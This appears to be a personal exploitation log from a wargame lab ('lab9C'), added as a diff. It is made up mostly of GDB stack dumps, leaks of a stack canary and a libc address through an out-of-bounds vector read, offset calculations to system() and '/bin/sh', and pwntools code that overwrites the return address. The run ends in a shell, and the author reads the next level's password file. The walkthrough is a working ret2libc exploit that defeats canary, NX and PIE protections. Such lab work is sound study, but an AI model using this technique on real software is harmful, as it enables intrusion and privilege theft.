+0xbffff3e8:     0xb7d3a604      0x00000006      0xbffff420      0x055f5b30
+0xbffff3f8:     0xabeb6602      0xb7eeea5c      0x00000000      0x00000000
+0xbffff408:     0x00000001      0x000003c4      0xb7d3a6e0      0xb7fda860
+0xbffff418:     0xb7f07aae      0xb7efd70c      0xb7ef269c      0x00000001
+0xbffff428:     0x00000001      0x000000df      0xb7d3a6e0      0xb7fff000
+0xbffff438:     0xbffff544      0xb7fdaa18      0xbffff500      0xb7fe77aa
+0xbffff448:     0xbffff4b0      0xb7ef269c      0xbffff4b8      0xb7fffa94
+0xbffff458:     0x00000000      0xb7d3a6e0      0x00000001      0x00000000
+0xbffff468:     0x00000001      0xb7fda860      0xbffff4d8      0xb7fffa94
+0xbffff478:     0x00000000      0xb7d3a6e0      0x00000001      0x00000000
+0xbffff488:     0x00000001      0x00000000      0xbffff544      0xbffff4b8
+0xbffff498:     0xbffff4b0      0xb7f07aae      0xb7fda860      0x00000000
+0xbffff4a8:     0x00000001      0x00000000      0xffffffff      0xbffff4d8
+0xbffff4b8:     0xb7ef269c      0xb7f33e80      0xb7fda860      0x00000000
+0xbffff4c8:     0x0000001b      0x00000000      0xffffffff      0xbffff4f8
+0xbffff4d8:     0xb7eef84c      0xb7fda860      0xb7fda860      0x00000000
+0xbffff4e8:     0xb7fdaa18      0xb7d3a820      0xffffffff      0xb7fff000
+0xbffff4f8:     0xb7fda860      0xb7fc9000      0xb7fcf878      0x00000000
+0xbffff508:     0xb7fced80      0xb7f31928      0xb7fc7d38      0x00000000
+0xbffff518:     0x00000006      0xb7fc7d38      0xb7fcf878      0xb7fc667c
+0xbffff528:     0xb7fcf878      0xbffff53c      0xb7efd70c      0xb7f46096
+0xbffff538:     0xb7fc9000      0xb7fcf878      0x00000006      0x00000000
+0xbffff548:     0x00000006      0x00000010      0xb7f44b6b      0xb7fcedf0
+0xbffff558:     0xb7fced84      0xb7f7bbe6      0xb7fcf878      0xb7fc667c
+0xbffff568:     0xb7fc7d38      0x00000000      0xb7f7d0f7      0xb7f7bb96
+0xbffff578:     0xb7fc9000      0xb7f530e1      0xb7fcedf0      0xb7ff2500
+0xbffff588:     0x0000000d      0xb7fd0194      0xb7fc9000      0xb7fced84
+0xbffff598:     0xb7fcea20      0xb7f53220      0xb7fced84      0xb7fcedf0
+0xbffff5a8:     0x00000000      0xb7d6e273      0xb7fc9000      0xb7fcee20
+0xbffff5b8:     0xb7fcef60      0xb7f435b8      0xb7fced84      0xb7fcea20
+0xbffff5c8:     0xb7d39048      0xb7ee5000      0x00000003      0x00000002
+0xbffff5d8:     0xbffff638      0xb7d6e42d      0xb7ee53c4      0xb7d3d6fc
+0xbffff5e8:     0xb7f42ec9      0x80002f8c      0x00000003      0xb7d6e416
+0xbffff5f8:     0x80002f8c      0x80001000      0xb7f43720      0x80003009
+0xbffff608:     0x80003004      0xbffff500      0x015a1f4f      0x2b43e9ed
+0xbffff618:     0x0000ffff      0x00000001      0xbffff680      0xb7fec181
+0xbffff628:     0xbffff644      0x6784a800      0x80002f8c      0x80002f8c
+0xbffff638:     0xbffff668      0x8000103c      0x00000001      0x0000ffff
+0xbffff648:     0xbffff664      0xb7d6e273      0xb7fd05c8      0xb7fd05d0
+0xbffff658:     0xb7fc54a8      0x6784a800      0x80000bb9      0x80002f8c
+0xbffff668:     0x00000001      0x800011d2      0x00000001      0xbffff734
+0xbffff678:     0xbffff73c      0xb7d6e42d      0xb7ee53c4      0xb7d6e416
+0xbffff688:     0x8000118b      0x6784a800      0x80001180      0xb7ee5000 <-- canary, saved ret, saved EBP
+[... snip ...]
+0xbffff698:     0x00000000      0xb7d54a83      0x00000001      0xbffff734
+0xbffff6a8:     0xbffff73c      0xb7feccea      0x00000001      0xbffff734
+gdb-peda$
+
+
+After filling:
+Breakpoint 1, 0x80000f32 in main ()
+gdb-peda$ x/1000wx $esp
+0xbffff250:     0xbffff280      0x00000001      0x00000002      0x00000000
+0xbffff260:     0x00000000      0xb7fe6dcd      0xbffff734      0x00000001
+0xbffff270:     0x00000000      0xb7fea8f0      0x00fff578      0x00000001
+0xbffff280:     0xb7fe6ecd      0x00000101      0xb7d4dffd      0x13371337
+0xbffff290:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff2a0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff2b0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff2c0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff2d0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff2e0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff2f0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff300:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff310:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff320:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff330:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff340:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff350:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff360:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff370:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff380:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff390:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff3a0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff3b0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff3c0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff3d0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff3e0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff3f0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff400:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff410:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff420:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff430:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff440:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff450:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff460:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff470:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff480:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff490:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff4a0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff4b0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff4c0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff4d0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff4e0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff4f0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff500:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff510:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff520:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff530:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff540:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff550:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff560:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff570:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff580:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff590:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff5a0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff5b0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff5c0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff5d0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff5e0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff5f0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff600:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff610:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff620:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff630:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff640:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff650:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff660:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff670:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff680:     0x13371337      0x13371337      0x13371337      0x6784a800 <-- canary
+0xbffff690:     0x80001180      0xb7ee5000      0x00000000      0xb7d54a83 <-- saved RET, saved EBP
+0xbffff6a0:     0x00000001      0xbffff734      0xbffff73c      0xb7feccea
+0xbffff6b0:     0x00000001      0xbffff734      0xbffff73c      0x00000008
+0xbffff6c0:     0xbffff730      0xb7ee5000      0x00000000      0x00000000
+0xbffff6d0:     0x00000000      0x72a458e1      0x27dd9cf1      0x00000000
+0xbffff6e0:     0x00000000      0x00000000      0xb7fde000      0x0000055c
+0xbffff6f0:     0xb7fde2dc      0x00000001      0xb7d54999      0x80002f8c
+0xbffff700:     0x00000001      0x80000b20      0x00000000      0x80000b51
+0xbffff710:     0x80000e0f      0x00000001      0xbffff734      0x80001180
+0xbffff720:     0x800011f0      0xb7fed180      0xbffff72c      0x0000001c
+
+OK, great. Let's leak them.
+
+[DEBUG] Received 0xe2 bytes:
+    'DSVector[257] = 1736747008\n'
+    '+------- DSVector Test Menu -------+\n'
+    '| 1. Append item                   |\n'
+    '| 2. Read item                     |\n'
+    '| 3. Quit                          |\n'
+    '+----------------------------------+\n'
+    'Enter choice: '
+DSVector[257] = 1736747008
++------- DSVector Test Menu -------+
+| 1. Append item                   |
+| 2. Read item                     |
+| 3. Quit                          |
++----------------------------------+
+Enter choice: $
+
+$ printf "%x" 1736747008
+6784a800 <-- here's our canary, at index 257
+
+And now saved EBP:
+
+[DEBUG] Received 0xe3 bytes:
+    'DSVector[258] = -2147479168\n'
+    '+------- DSVector Test Menu -------+\n'
+    '| 1. Append item                   |\n'
+    '| 2. Read item                     |\n'
+    '| 3. Quit                          |\n'
+    '+----------------------------------+\n'
+    'Enter choice: '
+DSVector[258] = -2147479168
++------- DSVector Test Menu -------+
+| 1. Append item                   |
+| 2. Read item                     |
+| 3. Quit                          |
++----------------------------------+
+Enter choice: $
+
+linux@DESKTOP-C7SN3L7:/mnt/c/Users/ewilded$ printf "%x" -2147479168
+ffffffff80001180linux@DESKTOP-C7SN3L7:/mnt/c/Users/ewilded$ printf "%x" 2147479168
+7fffee80linux@DESKTOP-C7SN3L7:/mnt/c/Users/ewilded$
+
+I guess we need to add 1 and negate. Oh I'll just read it in as a signed int.
+
+OK I guess we have it all.
+
+0xbffff630:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff640:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff650:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff660:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff670:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff680:     0x13371337      0x13371337      0x13371337      0xdea8d200
+0xbffff690:     0x80001180      0xb7ee5000      0x00000000      0xb7d54a83
+0xbffff6a0:     0x00000001      0xbffff734      0xbffff73c      0xb7feccea
+0xbffff6b0:     0x00000001      0xbffff734      0xbffff73c      0x00000008
+0xbffff6c0:     0xbffff730      0xb7ee5000      0x00000000      0x00000000
+0xbffff6d0:     0x00000000      0xa10a3a3a      0xf473fe2a      0x00000000
+0xbffff6e0:     0x00000000      0x00000000      0xb7fde000      0x0000055c
+0xbffff6f0:     0xb7fde2dc      0x00000001      0xb7d54999      0x80002f8c
+gdb-peda$ x 0xb7d54a83
+0xb7d54a83 <__libc_start_main+243>:     0xe8240489
+gdb-peda$ x 0x80001180
+0x80001180 <__libc_csu_init>:   0xff315755
+gdb-peda$ x/i 0x80001180
+   0x80001180 <__libc_csu_init>:        push   ebp
+gdb-peda$ x/i 0xb7d54a83
+   0xb7d54a83 <__libc_start_main+243>:  mov    DWORD PTR [esp],eax
+gdb-peda$ b *(main+267)
+
+Well. This is actually confusing. Although I have no doubt where the canary is, there are two candidates for the saved RET (I guess these are two saved RETs, one frame above another).
+
+It looks like main has a bit different stack layout. Between the stack canary and what looks like the saved EBP and the saved RET (according to https://devel0pment.de/?p=435#comment-1950 canary + 3dword + savedRET).
+
+Either way, the second one leaks libc, so we can use it to calculate system.
+
+When it comes to execution control, well, let's just find out by overwriting and quitting.
+
+b *(main+324)
+
+
+Stack smashing detected, the canary and the saved ret get overwritten with 0, wtf:
+0xbffff650:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff660:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff670:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff680:     0x13371337      0x13371337      0x13371337      0x00000000
+0xbffff690:     0x00000000      0xb7ee5000      0x00000000      0xb7d54a83
+0xbffff6a0:     0x00000001      0xbffff734      0xbffff73c      0xb7feccea
+0xbffff6b0:     0x00000001      0xbffff734      0xbffff73c      0x00000008
+
+Oh fuck the input is invalid. It's expecting a string representing a number in decimal.
+
+Not the literal raw brutal binary.
+
+
+OK, also added the value more times, as in fact the canary was being properly overwritten, but the program did not crash on 0x41414141.
+
+
+    print("OK, crashing it...")
+	
+    ret = 0x41414141
+    p.sendlineafter("Enter choice: ","1")
+    p.sendlineafter("Enter a number: ",str(canary)) # overwrite the canary with itself
+
+    p.sendlineafter("Enter choice: ","1")
+    p.sendlineafter("Enter a number: ",str(ret))
+    p.sendlineafter("Enter choice: ","1")
+    p.sendlineafter("Enter a number: ",str(ret))
+    p.sendlineafter("Enter choice: ","1")
+    p.sendlineafter("Enter a number: ",str(ret))
+    p.sendlineafter("Enter choice: ","1")
+    p.sendlineafter("Enter a number: ",str(ret))
+
+    p.sendlineafter("Enter choice: ","3")
+	## this should crash it
+    pause()
+    return 0
+	
+
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41414141
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6a0 --> 0x1
+0004| 0xbffff6a4 --> 0xbffff734 --> 0xbffff85e ("/levels/lab09/lab9C")
+0008| 0xbffff6a8 --> 0xbffff73c --> 0xbffff872 ("LESSOPEN=| /usr/bin/lesspipe %s")
+0012| 0xbffff6ac --> 0xb7feccea (<call_init+26>:        add    ebx,0x12316)
+0016| 0xbffff6b0 --> 0x1
+0020| 0xbffff6b4 --> 0xbffff734 --> 0xbffff85e ("/levels/lab09/lab9C")
+0024| 0xbffff6b8 --> 0xbffff73c --> 0xbffff872 ("LESSOPEN=| /usr/bin/lesspipe %s")
+0028| 0xbffff6bc --> 0x8
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41414141 in ?? ()
+gdb-peda$
+
+b *(main+236)		# print_menu
+
+
+Break at read:
+
+0xbffff680:     0x13371337      0x13371337      0x13371337      0x345a8400
+0xbffff690:     0x80001180      0xb7ee5000      0x00000000      0xb7d54a83 <-- leaked libc ret
+0xbffff6a0:     0x00000001      0xbffff734      0xbffff73c      0xb7feccea
+
+gdb-peda$ p system
+$1 = {<text variable, no debug info>} 0xb7d7b190 <__libc_system>
+
+gdb-peda$ vmmap
+Start      End        Perm      Name
+0x80000000 0x80002000 r-xp      /levels/lab09/lab9C
+0x80002000 0x80003000 r--p      /levels/lab09/lab9C
+0x80003000 0x80004000 rw-p      /levels/lab09/lab9C
+0xb7cd5000 0xb7cd7000 rw-p      mapped
+0xb7cd7000 0xb7cf3000 r-xp      /lib/i386-linux-gnu/libgcc_s.so.1
+0xb7cf3000 0xb7cf4000 rw-p      /lib/i386-linux-gnu/libgcc_s.so.1
+0xb7cf4000 0xb7d38000 r-xp      /lib/i386-linux-gnu/libm-2.19.so
+0xb7d38000 0xb7d39000 r--p      /lib/i386-linux-gnu/libm-2.19.so
+0xb7d39000 0xb7d3a000 rw-p      /lib/i386-linux-gnu/libm-2.19.so
+0xb7d3a000 0xb7d3b000 rw-p      mapped
+0xb7d3b000 0xb7ee3000 r-xp      /lib/i386-linux-gnu/libc-2.19.so
+0xb7ee3000 0xb7ee5000 r--p      /lib/i386-linux-gnu/libc-2.19.so
+0xb7ee5000 0xb7ee6000 rw-p      /lib/i386-linux-gnu/libc-2.19.so
+0xb7ee6000 0xb7ee9000 rw-p      mapped
+0xb7ee9000 0xb7fc5000 r-xp      /usr/lib/i386-linux-gnu/libstdc++.so.6.0.19
+0xb7fc5000 0xb7fc9000 r--p      /usr/lib/i386-linux-gnu/libstdc++.so.6.0.19
+0xb7fc9000 0xb7fca000 rw-p      /usr/lib/i386-linux-gnu/libstdc++.so.6.0.19
+0xb7fca000 0xb7fd1000 rw-p      mapped
+0xb7fd8000 0xb7fdb000 rw-p      mapped
+0xb7fdb000 0xb7fdc000 r-xp      [vdso]
+0xb7fdc000 0xb7fde000 r--p      [vvar]
+0xb7fde000 0xb7ffe000 r-xp      /lib/i386-linux-gnu/ld-2.19.so
+0xb7ffe000 0xb7fff000 r--p      /lib/i386-linux-gnu/ld-2.19.so
+0xb7fff000 0xb8000000 rw-p      /lib/i386-linux-gnu/ld-2.19.so
+0xbffdf000 0xc0000000 rw-p      [stack]
+gdb-peda$
+
+gdb-peda$ searchmem /bin/sh 0xb7d3b000 0xb7ee3000
+Searching for '/bin/sh' in range: 0xb7d3b000 - 0xb7ee3000
+Found 1 results, display max 1 items:
+libc : 0xb7e9ba24 ("/bin/sh")
+
+Values:
+
+libc_system = 0xb7d7b190
+libc_ret = 0xb7d54a83
+bin_sh_addr = 0xb7e9ba24
+
+Calculations:
+libc_system - libc_ret = 0xb7d7b190-0xb7d54a83  = 0x2670d
+libc_system = libc_ret + 0x2670d
+
+bin_sh_addr - libc_ret = 0xb7e9ba24-0xb7d54a83 = 0x146fa1
+bin_sh_addr = libc_ret + 0x146fa1
+
+
+lab9C@warzone:/tmp$ python exploit.py
+[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
+[*] '/levels/lab09/lab9C'
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process '/levels/lab09/lab9C': pid 3017
+PID: [3017]
+Press any key to fill the buffer with 256 elements 0x13371337...
+[*] Paused (press any to continue)
+Leaked canary: 0xae93fc00
+Leaked libc_ret: 0xb7d54a83
+system(): 0xb7d7b190
+/bin/sh: 0xb7e9ba24
+OK, shelling it...
+[*] Switching to interactive mode
+$ $ id
+uid=1033(lab9C) gid=1034(lab9C) groups=1034(lab9C),1001(gameuser)
+
+Nice, it works!
+
+Now remote version.
+
+
+    '+----------------------------------+\n'
+    'Enter choice: '
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+[DEBUG] Received 0x10 bytes:
+    'Enter a number: '
+[DEBUG] Sent 0xb bytes:
+    '3085548068\n'
+[DEBUG] Received 0xc7 bytes:
+    '+------- DSVector Test Menu -------+\n'
+    '| 1. Append item                   |\n'
+    '| 2. Read item                     |\n'
+    '| 3. Quit                          |\n'
+    '+----------------------------------+\n'
+    'Enter choice: '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[*] Switching to interactive mode
+$ id
+[DEBUG] Sent 0x3 bytes:
+    'id\n'
+[DEBUG] Received 0x42 bytes:
+    'uid=1034(lab9A) gid=1035(lab9A) groups=1035(lab9A),1001(gameuser)\n'
+uid=1034(lab9A) gid=1035(lab9A) groups=1035(lab9A),1001(gameuser)
+$ cat /home/lab9A/.pass
+[DEBUG] Sent 0x16 bytes:
+    'cat /home/lab9A/.pass\n'
+[DEBUG] Received 0x20 bytes:
+    '1_th0uGht_th4t_w4rn1ng_wa5_l4m3\n'
+1_th0uGht_th4t_w4rn1ng_wa5_l4m3
+$
+
+
+
+
